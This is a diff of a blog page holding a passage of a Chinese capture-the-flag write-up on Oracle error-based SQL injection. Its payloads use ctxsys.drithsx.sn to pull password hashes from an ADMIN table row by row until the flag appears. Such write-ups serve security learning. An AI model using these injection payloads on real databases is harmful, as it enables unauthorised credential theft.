+<p><img src="/2021/09/02/oracle%E6%B3%A8%E5%85%A5%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/10.png" alt="10"><br>&#x5F97;&#x5230;&#x5B57;&#x6BB5;UPASS<br>&#x67E5;&#x5185;&#x5BB9;<br><code>and 1=ctxsys.drithsx.sn(1,(select UPASS from ADMIN where rownum=1 ))</code></p>
+<p><img src="/2021/09/02/oracle%E6%B3%A8%E5%85%A5%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/11.png" alt="11"><br>&#x5F97;&#x5230;&#x6570;&#x636E;&#xFF1A;<code>f583aea84b6ded258f529205eb6d56a7</code><br>&#x7EE7;&#x7EED;&#x67E5;&#x5176;&#x4ED6;&#x6570;&#x636E;<br><code>and 1=ctxsys.drithsx.sn(1,(select UPASS from ADMIN where rownum=1 and UPASS &lt;&gt; &apos;f583aea84b6ded258f529205eb6d56a7&apos;))</code></p>
+<p><img src="/2021/09/02/oracle%E6%B3%A8%E5%85%A5%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/12.png" alt="12"><br>&#x8BD5;&#x8FC7;&#x53D1;&#x73B0;&#x8FD9;&#x4E2A;&#x4E5F;&#x4E0D;&#x662F;flag&#xFF0C;&#x7EE7;&#x7EED;<br><code>and 1=ctxsys.drithsx.sn(1,(select UPASS from ADMIN where rownum=1 and UPASS &lt;&gt; &apos;f583aea84b6ded258f529205eb6d56a7&apos; and UPASS &lt;&gt;  &apos;9e8e7f6953dd11ceccc6ce655e03e070&apos;))</code></p>
+<p><img src="/2021/09/02/oracle%E6%B3%A8%E5%85%A5%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/13.png" alt="13"><br>&#x5F97;&#x5230;flag&#xFF1A;<br><code>2a61f8bcfe7535eadcfa69eb4406ceb9</code><br>&#x8F93;&#x5165;&#x901A;&#x5173;</p>
 
     </div>
      
-    <div class="post-footer__meta"><p>updated at 2021-09-03</p></div> 
+    <div class="post-footer__meta"><p>updated at 2021-09-04</p></div> 
     <div class="post-entry__tags"></div> 
 </article>
 
@@ -218,7 +218,7 @@
     <div class="nav">
         <div class="nav__prev">
             
-                <a href="/2021/09/04/210903%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/210903%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/" class="nav__link">
+                <a href="/2021/09/04/msf/" class="nav__link">
                     <div>
                         <svg viewBox="0 0 1024 1024" xmlns="http://www.w3.org/2000/svg" width="24" height="24"><path d="M589.088 790.624L310.464 512l278.624-278.624 45.248 45.248L400.96 512l233.376 233.376z" fill="#808080"></path></svg>
                     </div>
@@ -227,7 +227,7 @@
                             Previous Post
                         </div>
                         <div class="nav__title">
-                            no title
+                            msf
                         </div>
                     </div>
                 </a>
